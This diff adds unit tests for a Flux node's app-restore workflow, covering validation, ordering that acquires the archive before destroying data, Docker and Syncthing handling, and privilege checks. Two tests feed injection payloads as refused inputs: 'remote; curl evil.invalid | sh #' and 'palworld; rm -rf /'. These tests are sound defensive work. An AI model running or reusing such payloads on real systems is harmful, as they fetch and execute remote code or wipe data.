+      // the list is a frozen snapshot to reads, so only finishRestore clears it.
+      globalState.finishRestore(appname);
+      globalState.receiveOnlySyncthingAppsCache.clear();
+      sinon.stub(serviceHelper, 'delay').resolves();
+      sinon.stub(serviceHelper, 'axiosGet').resolves({ data: { status: 'success', data: { ips: [localAddr] } } });
+      sinon.stub(verificationHelper, 'verifyPrivilege').resolves(true);
+      sinon.stub(registryManager, 'getApplicationGlobalSpecifications').resolves(specWith('g:/palworld/Pal/Saved|m:mods:/mods'));
+      sinon.stub(registryManager, 'getApplicationSpecifications').resolves(specWith('g:/palworld/Pal/Saved|m:mods:/mods'));
+      sinon.stub(syncthingService, 'adjustConfigFolders').resolves({ status: 'success' });
+      sinon.stub(syncthingService, 'getConfigFolders').resolves([{ id: folderId, path: `${appsFolder}${folderId}`, type: 'sendreceive' }]);
+      sinon.stub(dockerService, 'appDockerStop').resolves();
+      // The stop is verified by reading the container back, not by the stop
+      // call returning - so this stub is what makes the containers actually
+      // down for these tests. Set it Running to exercise the refusal.
+      sinon.stub(dockerService, 'dockerContainerInspect').resolves({ State: { Running: false } });
+      // dockerActual falls back to a LIST call when the inspect fails, to tell
+      // an unreachable daemon from a container that is genuinely gone. Docker is
+      // a network boundary and has to be stubbed at it - left real, these tests
+      // pass or fail on whether the machine running them happens to have docker.
+      sinon.stub(dockerService, 'dockerListContainers').resolves([]);
+      sinon.stub(dockerService, 'appDockerStart').resolves();
+      // Starting a component arms a sixty-second sampling interval against
+      // docker, and nothing here ever stops it. It outlives the test, wakes on a
+      // container that was never created, and writes an error through the real
+      // log into whichever test the suite happens to be running a minute later -
+      // which is a different one on every machine. Stubbed for the same reason
+      // dockerService.appDockerStart above is: this describe is about the
+      // restore, and docker is a boundary.
+      sinon.stub(appInspector, 'startAppMonitoring');
+      sinon.stub(fluxNetworkHelper, 'getLocalSocketAddress').resolves(localAddr);
+      sinon.stub(appController, 'executeAppGlobalCommand').resolves();
+      sinon.stub(appReconciler, 'setControllerDesired');
+      sinon.stub(IOUtils, 'getVolumeInfo').resolves({ error: null, mounts: [{ mount, available: 100 * 1024 * 1024 * 1024 }] });
+      sinon.stub(IOUtils, 'removeDirectory').resolves(true);
+      sinon.stub(IOUtils, 'downloadFileFromUrl').resolves(true);
+      sinon.stub(IOUtils, 'getRemoteFileSize').resolves(4096);
+      sinon.stub(IOUtils, 'getFileSize').resolves(4096);
+      sinon.stub(IOUtils, 'inspectTarGz').resolves({ status: true, entries: 1200, bytes: 900 * 1024 * 1024 });
+      sinon.stub(IOUtils, 'getDirectorySizeBytes').resolves(800 * 1024 * 1024);
+      sinon.stub(IOUtils, 'untarFile').resolves({ status: true });
+      sinon.stub(IOUtils, 'removeFile').resolves(true);
+      sinon.stub(log, 'info');
+      sinon.stub(log, 'warn');
+      sinon.stub(log, 'error');
+    });
+
+    describe('input validation', () => {
+      it('refuses a type that is not one of the three backup directories', async () => {
+        // type names a directory inside the volume and reaches a shell through
+        // tar, so an unrecognised one must be refused, never interpolated
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq({ type: 'remote; curl evil.invalid | sh #' }), makeRes());
+
+        expect(result).to.equal(false);
+        sinon.assert.notCalled(IOUtils.untarFile);
+        sinon.assert.notCalled(IOUtils.removeDirectory);
+        sinon.assert.notCalled(dockerService.appDockerStop);
+      });
+
+      it('refuses a restore that is not a list of components, not with a TypeError', async () => {
+        const res = makeRes();
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq({ restore: 'palworld' }), res);
+
+        expect(result).to.equal(false);
+        const said = res.write.getCalls().map((c) => c.args[0]).join(' ');
+        expect(said).to.include('restore must be a list of components');
+        expect(said, 'the refusal is stated, not relayed from the interpreter').to.not.include('is not a function');
+        sinon.assert.notCalled(IOUtils.untarFile);
+        expect(globalState.restoreInProgress).to.not.include(appname);
+      });
+
+      it('refuses a component the app does not have', async () => {
+        const req = restoreReq();
+        req.body.restore = [{ component: 'palworld; rm -rf /', restore: true, url: 'https://example.invalid/a.tar.gz' }];
+
+        const result = await advancedWorkflows.appendRestoreTask(req, makeRes());
+
+        expect(result).to.equal(false);
+        sinon.assert.notCalled(IOUtils.untarFile);
+        sinon.assert.notCalled(IOUtils.removeDirectory);
+      });
+
+      it('acts on a component named twice only once', async () => {
+        // the second pass would clear what the first had just put in place
+        const req = restoreReq();
+        req.body.restore = [
+          { component: 'palworld', restore: true, url: 'https://example.invalid/a.tar.gz' },
+          { component: 'palworld', restore: true, url: 'https://example.invalid/a.tar.gz' },
+        ];
+
+        await advancedWorkflows.appendRestoreTask(req, makeRes());
+
+        sinon.assert.calledOnce(IOUtils.untarFile);
+        sinon.assert.calledOnce(IOUtils.removeDirectory.withArgs(`${mount}/appdata`, true));
+      });
+
+      it('lets only one of two concurrent restores of the same app proceed', async () => {
+        // The claim is a synchronous test-and-set before any awaited work, so
+        // the first request holds the app before the second runs its own
+        // validation - the second finds it taken and refuses, rather than both
+        // passing an emptied check and clearing the same volume at once. (The
+        // old "push during the spec lookup" simulation no longer bites: the
+        // getter hands out a snapshot, so only the claim primitive can write.)
+        const first = advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+        const second = advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        const [firstResult, secondResult] = await Promise.all([first, second]);
+
+        expect([firstResult, secondResult]).to.have.members([true, false]);
+        // one restore ran, the other never touched the volume
+        sinon.assert.calledOnce(IOUtils.untarFile);
+      });
+
+      it('restores only the components asked for, not every one the UI listed', async () => {
+        registryManager.getApplicationGlobalSpecifications.resolves({
+          version: 8,
+          name: appname,
+          compose: [
+            { name: 'palworld', containerData: 'g:/palworld/Pal/Saved' },
+            { name: 'sidecar', containerData: '/data' },
+          ],
+        });
+
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.calledOnce(IOUtils.untarFile);
+        sinon.assert.calledWith(IOUtils.untarFile, `${mount}/appdata`);
+      });
+    });
+
+    describe('acquire before destroy', () => {
+      it('does not touch appdata when the archive is unreadable', async () => {
+        IOUtils.inspectTarGz.resolves({ status: false, error: 'gzip: unexpected end of file' });
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        expect(result).to.equal(false);
+        sinon.assert.neverCalledWith(IOUtils.removeDirectory, `${mount}/appdata`);
+        sinon.assert.notCalled(IOUtils.untarFile);
+      });
+
+      it('does not touch appdata when the archive holds nothing', async () => {
+        IOUtils.inspectTarGz.resolves({ status: true, entries: 0, bytes: 0 });
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        expect(result).to.equal(false);
+        sinon.assert.neverCalledWith(IOUtils.removeDirectory, `${mount}/appdata`);
+      });
+
+      it('does not touch appdata when the download arrived short', async () => {
+        IOUtils.getRemoteFileSize.resolves(18 * 1024 * 1024);
+        IOUtils.getFileSize.resolves(4 * 1024 * 1024);
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        expect(result).to.equal(false);
+        sinon.assert.neverCalledWith(IOUtils.removeDirectory, `${mount}/appdata`);
+        sinon.assert.notCalled(IOUtils.untarFile);
+      });
+
+      it('reads the archive before it clears appdata, not after', async () => {
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.callOrder(
+          IOUtils.inspectTarGz,
+          IOUtils.removeDirectory.withArgs(`${mount}/appdata`, true),
+          IOUtils.untarFile,
+        );
+      });
+
+      it('refuses when the archive cannot fit in the room clearing appdata frees', async () => {
+        IOUtils.getVolumeInfo.resolves({ error: null, mounts: [{ mount, available: 2 * 1024 * 1024 * 1024 }] });
+        IOUtils.getDirectorySizeBytes.resolves(1 * 1024 * 1024 * 1024);
+        IOUtils.inspectTarGz.resolves({ status: true, entries: 10, bytes: 30 * 1024 * 1024 * 1024 });
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        expect(result).to.equal(false);
+        sinon.assert.neverCalledWith(IOUtils.removeDirectory, `${mount}/appdata`);
+      });
+
+      it('measures free space after the download, not before it', async () => {
+        // a remote restore writes the archive into the same volume it is about
+        // to extract into, so free space read before the download over-states
+        // the room by the size of the archive itself
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.callOrder(
+          IOUtils.downloadFileFromUrl,
+          IOUtils.getVolumeInfo.withArgs(appname, 'palworld', 'B', 0, 'available'),
+          IOUtils.removeDirectory.withArgs(`${mount}/appdata`, true),
+        );
+      });
+
+      it('refuses when the volume is not mounted rather than failing on undefined', async () => {
+        // df only reports mounted filesystems, so an empty mounts array is the
+        // shape an unmounted volume takes. Asserting the message matters:
+        // reading [0].mount off it also ends the restore, but as a TypeError.
+        const res = makeRes();
+        IOUtils.getVolumeInfo.resolves({ error: null, mounts: [] });
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), res);
+
+        expect(result).to.equal(false);
+        sinon.assert.notCalled(IOUtils.untarFile);
+        sinon.assert.calledWithMatch(res.write, /volume is not mounted/);
+      });
+
+      it('refuses distinctly when the mount table cannot be read, not as "not mounted"', async () => {
+        // A failure to read the mount table is not a verdict that the volume is
+        // absent - restore is destructive, so it refuses on the unknown rather
+        // than clearing data it could not confirm the location of.
+        const res = makeRes();
+        IOUtils.getVolumeInfo.resolves({ error: new Error('cannot read mounts'), mounts: [] });
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), res);
+
+        expect(result).to.equal(false);
+        sinon.assert.notCalled(IOUtils.untarFile);
+        sinon.assert.calledWithMatch(res.write, /could not be read/);
+      });
+    });
+
+    describe('the other instances', () => {
+      it('never asks a peer to redeploy', async () => {
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.neverCalledWith(appController.executeAppGlobalCommand, appname, 'redeploy');
+      });
+
+      it('leaves a g: app alone - the other instances are stopped and syncthing carries it', async () => {
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.notCalled(appController.executeAppGlobalCommand);
+      });
+
+      it('restarts the peers of an s: component, whose containers are all running', async () => {
+        registryManager.getApplicationGlobalSpecifications.resolves(specWith('s:/data'));
+        registryManager.getApplicationSpecifications.resolves(specWith('s:/data'));
+
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.calledWithExactly(appController.executeAppGlobalCommand, appname, 'apprestart', 'auth', undefined, true);
+      });
+
+      it('leaves an unsynced app alone entirely - no peer holds its data', async () => {
+        registryManager.getApplicationGlobalSpecifications.resolves(specWith('/data'));
+        registryManager.getApplicationSpecifications.resolves(specWith('/data'));
+
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.notCalled(appController.executeAppGlobalCommand);
+        sinon.assert.neverCalledWith(syncthingService.adjustConfigFolders, 'patch', { paused: true }, folderId);
+      });
+
+      it('does not fan out when the restore failed', async () => {
+        registryManager.getApplicationGlobalSpecifications.resolves(specWith('s:/data'));
+        registryManager.getApplicationSpecifications.resolves(specWith('s:/data'));
+        IOUtils.untarFile.resolves({ status: false, error: 'no space left on device' });
+
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.notCalled(appController.executeAppGlobalCommand);
+      });
+    });
+
+    describe('the syncthing folder', () => {
+      it('pauses the folder per component and never deletes it', async () => {
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.calledWithExactly(syncthingService.adjustConfigFolders, 'patch', { paused: true }, folderId);
+        sinon.assert.calledWithExactly(syncthingService.adjustConfigFolders, 'patch', { paused: false }, folderId);
+        sinon.assert.neverCalledWith(syncthingService.adjustConfigFolders, 'delete');
+      });
+
+      it('leaves the folder paused when a failed restore cannot demote it', async () => {
+        // The folder holds partial data. Demoted it heals from the peers;
+        // resumed while still sendreceive it hands the deletions and the
+        // wreckage to every healthy peer. So a demotion that did not happen
+        // must keep the folder out of the resume.
+        IOUtils.untarFile.resolves({ status: false, error: 'no space left on device' });
+        syncthingService.adjustConfigFolders
+          .withArgs('patch', { type: 'receiveonly' }, folderId)
+          .resolves({
+            status: 'error',
+            data: {
+              message: 'Request failed with status code 500', name: 'AxiosError', code: 'ERR_BAD_RESPONSE', httpStatus: 500,
+            },
+          });
+
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.neverCalledWith(syncthingService.adjustConfigFolders, 'patch', { paused: false }, folderId);
+        // the healing marks still go on: they are what the machinery needs
+        // if the demotion lands on a later pass
+        expect(globalState.receiveOnlySyncthingAppsCache.get(folderId)).to.deep.equal({
+          restarted: false,
+          numberOfExecutions: 0,
+        });
+        sinon.assert.calledWithExactly(appReconciler.setControllerDesired, folderId, 'stopped', 'restore did not complete');
+      });
+
+      it('demotes a failed restore straight at the folder id, then resumes it', async () => {
+        // The demotion is patched directly, with no config pre-read: a safety
+        // action must not be conditioned on a fallible read whose failure
+        // silently reads as "nothing to protect". Demoted, the resumed folder
+        // is receiveonly - it heals from the peers instead of feeding them.
+        IOUtils.untarFile.resolves({ status: false, error: 'no space left on device' });
+
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.calledWithExactly(syncthingService.adjustConfigFolders, 'patch', { type: 'receiveonly' }, folderId);
+        sinon.assert.notCalled(syncthingService.getConfigFolders);
+        sinon.assert.calledWithExactly(syncthingService.adjustConfigFolders, 'patch', { paused: false }, folderId);
+      });
+
+      it('refuses before clearing anything when a container will not stop', async () => {
+        // appdata lives on a volume the container is still writing to. Clearing
+        // it under a live container leaves the app writing into a half-emptied
+        // tree, and able to save its own state back over what the archive puts
+        // there - the same shape as the loss, contained to this node.
+        dockerService.dockerContainerInspect.resolves({ State: { Running: true } });
+
+        const res = makeRes();
+        await advancedWorkflows.appendRestoreTask(restoreReq(), res);
+
+        sinon.assert.notCalled(IOUtils.removeDirectory);
+        sinon.assert.notCalled(IOUtils.untarFile);
+        expect(res.write.getCalls().map((c) => c.args[0]).join('')).to.match(/Refused: .*could not be stopped/);
+      });
+
+      it('reads the container back rather than trusting the stop call', async () => {
+        // a stop that returned is not a container that is down
+        dockerService.appDockerStop.resolves('Flux App successfully stopped.');
+        dockerService.dockerContainerInspect.resolves({ State: { Running: true } });
+
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.called(dockerService.dockerContainerInspect);
+        sinon.assert.notCalled(IOUtils.removeDirectory);
+      });
+
+      it('stops every component even when one of them fails', async () => {
+        // the catch used to sit outside the loop, so the first failure skipped
+        // every component after it - and the caller saw nothing
+        registryManager.getApplicationSpecifications.resolves({
+          version: 8,
+          name: appname,
+          compose: [
+            { name: 'alpha', containerData: 's:/data' },
+            { name: 'beta', containerData: 's:/data' },
+          ],
+        });
+        dockerService.appDockerStop.withArgs(`alpha_${appname}`).rejects(new Error('docker busy'));
+
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.calledWith(dockerService.appDockerStop, `alpha_${appname}`);
+        sinon.assert.calledWith(dockerService.appDockerStop, `beta_${appname}`);
+      });
+
+      it('waits for a daemon that is mid-restart rather than reading silence as running', async () => {
+        // A dockerd restart is exactly what suite 44 fires at a live backup. The
+        // inspect and the list both fail while it is down; neither says the
+        // container is up, and giving up here would release the operation's
+        // lease and hand the app back to the reconciler mid-flight.
+        const down = new Error('connect ENOENT /var/run/docker.sock');
+        dockerService.dockerContainerInspect.onCall(0).rejects(down);
+        dockerService.dockerListContainers.onCall(0).rejects(down);
+        dockerService.dockerContainerInspect.resolves({ State: { Running: false } });
+
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.called(IOUtils.untarFile);
+      });
+
+      it('refuses on a daemon that never answers, and says that is what happened', async () => {
+        const down = new Error('connect ENOENT /var/run/docker.sock');
+        dockerService.dockerContainerInspect.rejects(down);
+        dockerService.dockerListContainers.rejects(down);
+
+        const res = makeRes();
+        await advancedWorkflows.appendRestoreTask(restoreReq(), res);
+
+        sinon.assert.notCalled(IOUtils.removeDirectory);
+        sinon.assert.notCalled(IOUtils.untarFile);
+        // the operator is told the daemon did not answer - not that the
+        // container refused to stop, which was never established
+        expect(res.write.getCalls().map((c) => c.args[0]).join('')).to.match(/Refused: docker is not answering/);
+      });
+
+      it('tells a container that is gone from a daemon that cannot answer', async () => {
+        // both arrive as an inspect failure; only the list tells them apart, and
+        // only one of them is a reason to refuse
+        const err = new Error('No such container');
+        dockerService.dockerContainerInspect.rejects(err);
+        dockerService.dockerListContainers.resolves([]);
+
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.called(IOUtils.untarFile);
+      });
+
+      it('refuses while the container exists but its run state cannot be read', async () => {
+        // docker is up and lists the container, but the inspect keeps failing:
+        // it exists and we do not know whether it is running. That is not
+        // "stopped" - destroying its data on the strength of it is exactly what
+        // reading an unknown as an answer costs.
+        sinon.stub(dockerService, 'getAppDockerNameIdentifier').returns('/fluxpalworld_x');
+        dockerService.dockerContainerInspect.rejects(new Error('EOF'));
+        dockerService.dockerListContainers.resolves([{ Names: ['/fluxpalworld_x'] }]);
+
+        const res = makeRes();
+        await advancedWorkflows.appendRestoreTask(restoreReq(), res);
+
+        sinon.assert.notCalled(IOUtils.removeDirectory);
+        sinon.assert.notCalled(IOUtils.untarFile);
+        expect(res.write.getCalls().map((c) => c.args[0]).join('')).to.match(/Refused: docker is not answering/);
+      });
+
+      it('waits for the daemon once, not once per component', async () => {
+        // The daemon is a property of the node. Waiting it out per component
+        // multiplies the refusal's latency by the compose count - five minutes
+        // on a five-component app, which outlives the suite that would catch it.
+        registryManager.getApplicationSpecifications.resolves({
+          version: 8,
+          name: appname,
+          compose: [
+            { name: 'alpha', containerData: 's:/data' },
+            { name: 'beta', containerData: 's:/data' },
+            { name: 'gamma', containerData: 's:/data' },
+          ],
+        });
+        const down = new Error('connect ENOENT /var/run/docker.sock');
+        dockerService.dockerContainerInspect.rejects(down);
+        dockerService.dockerListContainers.rejects(down);
+
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        // one component's worth of probing, then it gives up for the node
+        const probes = dockerService.dockerListContainers.callCount;
+        expect(probes, `probed ${probes} times - should stop after one component`).to.be.at.most(12);
+        sinon.assert.notCalled(IOUtils.untarFile);
+      });
+
+      it('says what it is waiting for, so a held stream is not silent', async () => {
+        // the response has already returned 200; a minute of nothing is a minute
+        // in which anything in front of it may call the connection idle
+        const down = new Error('connect ENOENT /var/run/docker.sock');
+        dockerService.dockerContainerInspect.onCall(0).rejects(down);
+        dockerService.dockerListContainers.onCall(0).rejects(down);
+        dockerService.dockerContainerInspect.resolves({ State: { Running: false } });
+
+        const res = makeRes();
+        await advancedWorkflows.appendRestoreTask(restoreReq(), res);
+
+        expect(res.write.getCalls().map((c) => c.args[0]).join('')).to.match(/Docker is not answering .* waiting/);
+      });
+
+      it('refuses before clearing anything when the folder cannot be held still', async () => {
+        // The folder path is the mount ROOT, so appdata is inside the replicated
+        // scope: clearing it under a folder that is still sendreceive turns the
+        // clear into deletions this node broadcasts to every healthy peer. That
+        // is the quiet half of the 2026-08-04 loss, with no redeploy involved.
+        // A transient failure cannot tell us the folder is held, so nothing may
+        // be destroyed on the strength of it.
+        syncthingService.adjustConfigFolders
+          .withArgs('patch', { paused: true }, folderId)
+          .resolves({ status: 'error', data: { code: 'ECONNREFUSED', message: 'socket hang up' } });
+
+        const res = makeRes();
+        await advancedWorkflows.appendRestoreTask(restoreReq(), res);
+
+        sinon.assert.notCalled(IOUtils.removeDirectory);
+        sinon.assert.notCalled(IOUtils.untarFile);
+        // the UI never checks HTTP status, so the refusal has to be legible in
+        // the stream itself, and leading - the restore caption truncates at 50
+        expect(res.write.getCalls().map((c) => c.args[0]).join('')).to.match(/Refused: .*could not be held still/);
+        expect(globalState.restoreInProgress).to.not.include(appname);
+      });
+
+      it('proceeds when syncthing has no such folder, because nothing is replicating it', async () => {
+        // A 4xx is an answer, not a failure: syncthing does not know the folder,
+        // so there is nothing to hold still and nothing to broadcast.
+        syncthingService.adjustConfigFolders
+          .withArgs('patch', { paused: true }, folderId)
+          .resolves({ status: 'error', data: { code: 'ERR_BAD_REQUEST', message: 'Request failed with status code 404', httpStatus: 404 } });
+
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.called(IOUtils.untarFile);
+        // never resumed, because it was never held
+        sinon.assert.neverCalledWith(syncthingService.adjustConfigFolders, 'patch', { paused: false }, folderId);
+      });
+
+      it('resumes the folder when the restore fails', async () => {
+        IOUtils.inspectTarGz.resolves({ status: false, error: 'gzip: unexpected end of file' });
+
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.calledWithExactly(syncthingService.adjustConfigFolders, 'patch', { paused: false }, folderId);
+        expect(globalState.restoreInProgress).to.not.include(appname);
+      });
+
+      it('marks the restored copy settled so the peers take it', async () => {
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        expect(globalState.receiveOnlySyncthingAppsCache.get(folderId)).to.include({ restarted: true });
+      });
+
+      it('holds a half-written copy out of sync instead of broadcasting it', async () => {
+        // the unpack failed with appdata already cleared, so what is on disk is
+        // neither copy. Demoted, held, and marked NOT settled - a settled entry
+        // sends the folder state machine down the path that starts the
+        // container on exactly this partial data
+        IOUtils.untarFile.resolves({ status: false, error: 'no space left on device' });
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        expect(result).to.equal(false);
+        sinon.assert.calledWith(syncthingService.adjustConfigFolders, 'patch', { type: 'receiveonly' });
+        expect(globalState.receiveOnlySyncthingAppsCache.get(folderId)).to.include({ restarted: false });
+        sinon.assert.calledWith(appReconciler.setControllerDesired, folderId, 'stopped');
+      });
+
+      it('holds an unsynced component too, which has no peer to be put right by', async () => {
+        // The demotion means nothing without a folder, but the hold does. A
+        // component that syncs can be repaired by its peers, so holding it costs
+        // it minutes; one that does not sync has no repair path at all, and an
+        // app restarted on a half-replaced directory writes fresh state over the
+        // wreckage - after which even a good archive lands on top of that.
+        registryManager.getApplicationGlobalSpecifications.resolves(specWith('/data'));
+        registryManager.getApplicationSpecifications.resolves(specWith('/data'));
+        IOUtils.untarFile.resolves({ status: false, error: 'no space left on device' });
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        expect(result).to.equal(false);
+        sinon.assert.calledWith(appReconciler.setControllerDesired, folderId, 'stopped');
+        // nothing to demote, so nothing is demoted
+        sinon.assert.neverCalledWith(syncthingService.adjustConfigFolders, 'patch', { type: 'receiveonly' }, folderId);
+      });
+
+      it('leaves a component that restored cleanly alone when a later one fails', async () => {
+        registryManager.getApplicationGlobalSpecifications.resolves({
+          version: 8,
+          name: appname,
+          compose: [
+            { name: 'palworld', containerData: 'g:/palworld/Pal/Saved' },
+            { name: 'mods', containerData: 'g:/mods' },
+          ],
+        });
+        const req = restoreReq();
+        req.body.restore = [
+          { component: 'palworld', restore: true, url: 'https://example.invalid/a.tar.gz' },
+          { component: 'mods', restore: true, url: 'https://example.invalid/b.tar.gz' },
+        ];
+        IOUtils.untarFile.onFirstCall().resolves({ status: true });
+        IOUtils.untarFile.onSecondCall().resolves({ status: false, error: 'no space left on device' });
+
+        await advancedWorkflows.appendRestoreTask(req, makeRes());
+
+        // only the one that was mid-replacement is demoted
+        sinon.assert.neverCalledWith(appReconciler.setControllerDesired, folderId, 'stopped');
+        sinon.assert.calledWith(appReconciler.setControllerDesired, `fluxmods_${appname}`, 'stopped');
+      });
+    });
+
+    describe('the archive', () => {
+      it('removes the copy it downloaded only once the app is back up', async () => {
+        // deleting it the moment the unpack returned - before the app had been
+        // started - threw away the one thing a failure could be retried from
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.calledWithExactly(IOUtils.removeFile, `${mount}/backup/remote/backup_palworld.tar.gz`);
+        sinon.assert.callOrder(IOUtils.untarFile, dockerService.appDockerStart, IOUtils.removeFile);
+      });
+
+      it('keeps an uploaded archive - it is the owner\'s copy, not ours', async () => {
+        const req = restoreReq({ type: 'upload' });
+        req.body.restore = [{ component: 'palworld', restore: true }];
+
+        await advancedWorkflows.appendRestoreTask(req, makeRes());
+
+        sinon.assert.notCalled(IOUtils.removeFile);
+      });
+
+      it('keeps the downloaded archive when the restore failed, so it can be retried', async () => {
+        IOUtils.untarFile.resolves({ status: false, error: 'no space left on device' });
+
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.notCalled(IOUtils.removeFile);
+      });
+    });
+
+    describe('where the restore runs', () => {
+      it('refuses a g: restore on an instance that is not the one FDM points at', async () => {
+        fdmNames('9.9.9.9:16127');
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        expect(result).to.equal(false);
+        sinon.assert.notCalled(dockerService.appDockerStop);
+        sinon.assert.notCalled(IOUtils.untarFile);
+      });
+
+      it('proceeds on a different instance when force is given', async () => {
+        fdmNames('9.9.9.9:16127');
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq({ force: true }), makeRes());
+
+        expect(result).to.equal(true);
+        sinon.assert.called(IOUtils.untarFile);
+      });
+
+      it('proceeds when FDM cannot be reached - an unreachable FDM must not block a restore', async () => {
+        serviceHelper.axiosGet.rejects(new Error('ECONNREFUSED'));
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        expect(result).to.equal(true);
+        sinon.assert.called(IOUtils.untarFile);
+      });
+
+      it('does not consult FDM for a component with no elected writer', async () => {
+        registryManager.getApplicationGlobalSpecifications.resolves(specWith('s:/data'));
+        registryManager.getApplicationSpecifications.resolves(specWith('s:/data'));
+
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.notCalled(serviceHelper.axiosGet);
+      });
+
+      // A bare app name fans out to every component on the way down AND on the
+      // way back up, so this task can start an elected component the election
+      // placed elsewhere - and the folders are back in sendreceive by then, so it
+      // writes into live replicated storage at once. It may start one only where
+      // FDM said the primary is here.
+      it('starts the elected component when FDM confirms this node is the primary', async () => {
+        // the default stub answers with this node's own address
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.calledWith(dockerService.appDockerStart, `palworld_${appname}`);
+      });
+
+      it('leaves the elected component to the election when FDM cannot be reached', async () => {
+        serviceHelper.axiosGet.rejects(new Error('ECONNREFUSED'));
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        expect(result, 'the restore itself still runs - silence must not block one').to.equal(true);
+        sinon.assert.called(IOUtils.untarFile);
+        sinon.assert.neverCalledWith(dockerService.appDockerStart, `palworld_${appname}`);
+      });
+
+      it('leaves the elected component to the election when force skipped the check', async () => {
+        fdmNames('9.9.9.9:16127');
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq({ force: true }), makeRes());
+
+        expect(result).to.equal(true);
+        sinon.assert.neverCalledWith(dockerService.appDockerStart, `palworld_${appname}`);
+      });
+
+      // The collateral case, and the one that needs no FDM failure at all: an
+      // elected component that is not a target of this restore is stopped by the
+      // fan-out anyway. Nothing consults FDM, because no TARGET is elected - so
+      // the primary is unknown and that component is not this task's to start.
+      // The rest of the app still comes back, or this test would pass on a
+      // restore that started nothing.
+      it('does not start an elected component that was never part of the restore', async () => {
+        const twoComponents = {
+          version: 8,
+          name: appname,
+          compose: [
+            { name: 'palworld', containerData: 'g:/palworld/Pal/Saved' },
+            { name: 'sidecar', containerData: '/data' },
+          ],
+        };
+        registryManager.getApplicationGlobalSpecifications.resolves(twoComponents);
+        registryManager.getApplicationSpecifications.resolves(twoComponents);
+        const req = restoreReq();
+        req.body.restore = [
+          { component: 'palworld', restore: false, url: '' },
+          { component: 'sidecar', restore: true, url: 'https://example.invalid/backup_sidecar.tar.gz' },
+        ];
+
+        const result = await advancedWorkflows.appendRestoreTask(req, makeRes());
+
+        expect(result).to.equal(true);
+        sinon.assert.calledWith(dockerService.appDockerStart, `sidecar_${appname}`);
+        sinon.assert.neverCalledWith(dockerService.appDockerStart, `palworld_${appname}`);
+      });
+    });
+
+    it('restores a legacy app, which addresses its single volume as null', async () => {
+      const legacy = { version: 3, name: appname, containerData: 'g:/data' };
+      registryManager.getApplicationGlobalSpecifications.resolves(legacy);
+      registryManager.getApplicationSpecifications.resolves(legacy);
+      const req = restoreReq();
+      req.body.restore = [{ component: 'null', restore: true, url: 'https://example.invalid/a.tar.gz' }];
+
+      const result = await advancedWorkflows.appendRestoreTask(req, makeRes());
+
+      expect(result).to.equal(true);
+      sinon.assert.calledWith(IOUtils.getVolumeInfo, appname, 'null');
+    });
+
+    // appownerorfluxteam admits the app's owner and the flux team, and refuses the
+    // node operator - so the string this asks for is the whole of the policy. A
+    // restore overwrites a customer's volume from an archive the caller names,
+    // which makes it the most destructive of the file verbs, not the mildest.
+    it('gates a restore on the privilege that refuses the node operator', async () => {
+      verificationHelper.verifyPrivilege.resolves(false);
+      const req = restoreReq();
+
+      await advancedWorkflows.appendRestoreTask(req, makeRes());
+
+      sinon.assert.calledOnceWithExactly(verificationHelper.verifyPrivilege, Privilege.APP_OWNER_OR_FLUX_TEAM, authOf(req), { appName: appname });
+      sinon.assert.notCalled(IOUtils.getVolumeInfo);
     });
   });
 
